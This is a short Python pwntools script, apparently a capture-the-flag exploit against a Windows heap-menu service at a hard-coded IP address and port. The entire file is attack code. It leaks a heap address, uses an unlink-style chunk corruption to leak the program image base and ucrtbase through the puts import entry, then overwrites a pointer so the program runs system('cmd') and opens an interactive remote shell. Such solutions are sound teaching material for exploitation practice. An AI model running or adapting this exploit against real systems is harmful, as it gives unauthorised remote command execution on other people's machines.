from pwn import *
#context.log_level = 'debug'
p = remote("47.94.245.208", 23333)
    	
def add(size):
	p.sendlineafter("option >\r\n", '1')
	p.sendlineafter("size >\r\n", str(size))
def show(idx):
	p.sendlineafter("option >\r\n", '3')
	p.sendlineafter("index >\r\n", str(idx))
def free(idx):
	p.sendlineafter("option >\r\n", '2')
	p.sendlineafter("index >\r\n", str(idx))
def edit(idx, content):
	p.sendlineafter("option >\r\n", '4')
	p.sendlineafter("index >\r\n", str(idx))
	p.sendlineafter("content  >\r\n", content)
def exp():
	for i in range(6):
		add(32)
	free(2)
	free(4)
	show(2)
	heap_addr = u32(p.recvuntil("\r", drop=True)[:4])
	log.info("heap_addr ==> " + hex(heap_addr))
	edit(2, p32(heap_addr-0xd8)+p32(heap_addr-0xd4))
	free(1)
	show(2)
	p.recv(4)
	image_base = u32(p.recv(4))-0x1043
	log.info("image_base ==> " + hex(image_base))
	puts_iat = image_base + 0x20c4
	log.info("puts_iat  ==> " + hex(puts_iat))
	edit(2, p32(puts_iat)+p32(image_base+0x1040)+p32(heap_addr-0xe8))
	show(2)
	ucrtbase = u32(p.recv(4))-0xb89f0
	log.info("ucrtbase  ==> " + hex(ucrtbase))
	system = ucrtbase+0xefda0
	edit(0, 'cmd\x00')
	edit(3, p32(system)+p32(heap_addr-0x60))
	show(0)
	p.interactive()
if __name__ == '__main__':
	exp()
